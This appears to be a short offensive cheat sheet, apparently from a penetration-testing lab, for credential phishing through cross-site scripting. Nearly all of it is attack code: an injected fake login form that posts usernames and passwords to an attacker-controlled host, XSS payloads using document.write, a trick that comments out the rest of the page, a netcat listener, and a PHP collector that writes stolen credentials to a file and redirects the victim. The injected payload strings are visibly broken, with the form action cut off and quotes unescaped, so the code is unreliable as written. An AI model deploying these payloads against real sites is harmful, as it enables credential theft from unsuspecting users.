# Phishing attack using XSS
***
### Form to exfiltrate credentials, by sending them to our server
```HTML
<div>
<h2>Login to access your information</h2>
<form action=http://IP:PORT>
    <input type="username" name="username" required>
    <input type="password" name="password" required>
    <input type="submit" value="Login">
</form>
</div>
```
```HTML
<div>
<h3>Login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

### XSS Payload
```HTML
<script>document.write("<div><h2>Login to access your information</h2><form action=http:<input type="username" name="username" required><input type="password" name="password" required><input type="submit" value="Login"></form></div>")</script>
```
### Cleaning Up

```HTML
<script>document.write("<div><h2>Login to access your information</h2><form action=http:<input type="username" name="username" required><input type="password" name="password" required><input type="submit" value="Login"></form></div>");document.getElementById("url")</script>
```

### Commenting the code after the injected one
```HTML
<script>...PAYLOAD... <!--</script>
```

### Setting up the listening server to receive the credentials
####

```BASH
$ nc -lvnp 80
```

### PHP script to store the credentials on a txt file and redirects user to the original page
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/index.php");
    fclose($file);
    exit();
}
?>
```

### Using a PHP listening server instead of netcat
```BASH
$ mkdir /tmp/tmpsrogue
$ cd /tmp/tmpsrogue
$ vi index.php #write our index.php file
$ sudo php -S 0.0.0.0:80
$ PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```